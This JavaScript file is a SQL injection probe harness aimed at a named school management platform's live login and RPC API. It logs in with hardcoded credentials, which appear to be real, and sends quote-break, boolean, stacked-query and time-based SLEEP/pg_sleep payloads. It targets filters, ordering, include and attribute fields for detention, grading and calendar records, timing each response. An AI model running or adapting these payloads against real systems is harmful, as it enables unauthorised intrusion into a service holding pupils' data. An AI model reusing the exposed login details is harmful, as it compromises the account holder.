// working probe harness — moduleName:null, main/<kebab> for core models
const B = 'https://login.schulmanager-online.de';
const BUNDLE = '0d024d5311';
const EMAIL = 'frislop21@gmail.com';
const PASS = 'Neodeo34!!';

async function login() {
  const r = await fetch(B + '/api/login', {
    method: 'POST', headers: { 'content-type': 'application/json' },
    body: JSON.stringify({ emailOrUsername: EMAIL, password: PASS, hash: null, mobileApp: false, userId: null, twoFactorCode: null, institutionId: null })
  });
  return (await r.json()).jwt;
}

function rpc(jwt, model, action, params, ui = 'main.dashboard') {
  return fetch(B + '/api/calls', {
    method: 'POST',
    headers: { 'content-type': 'application/json', authorization: 'Bearer ' + jwt },
    body: JSON.stringify({ bundleVersion: BUNDLE, requests: [{ moduleName: null, endpointName: 'poqa', parameters: { action: { model, action, parameters: params }, uiState: ui } }] })
  }).then(r => r.json()).then(j => j.results[0]);
}

const PAYLOADS = {
  base: 1,
  quote: "1'",
  dquote: '1"',
  orTrue: '1 OR 1=1',
  orFalse: '1 AND 1=2',
  paren: '1)',
  comment: '1-- -',
  stacked: "1'; SELECT 1-- -",
  sleepMy: "1' AND (SELECT 1 FROM (SELECT SLEEP(3))a)-- -",
  sleepPg: "1' AND 1=(SELECT 1 FROM pg_sleep(3))-- -",
};

(async () => {
  const jwt = await login();
  const models = ['modules/detention/detention-event', 'modules/grades/grading-block', 'modules/calendar/event'];
  for (const m of models) {
    console.log('\n== ' + m);
    const base = await rpc(jwt, m, 'findAll', [{ limit: 1 }]);
    console.log('baseline', base.status, JSON.stringify(base.data || null).slice(0, 80));
    for (const [name, v] of Object.entries(PAYLOADS)) {
      const t0 = Date.now();
      const r = await rpc(jwt, m, 'findAll', [{ where: { id: v }, limit: 1 }]);
      console.log(' id=' + name.padEnd(9), 'st=' + r.status, (Date.now() - t0) + 'ms');
    }
    // order / include surfaces
    for (const [name, params] of Object.entries({
      orderInject: [{ limit: 1, order: [["id' --", 'DESC']] }],
      includeUnknown: [{ limit: 1, include: [{ association: "x' OR 1=1-- -" }] }],
      attrInject: [{ limit: 1, attributes: ["id' --"] }],
    })) {
      const r = await rpc(jwt, m, 'findAll', params);
      console.log(' ' + name.padEnd(14), 'st=' + r.status);
    }
  }
})();
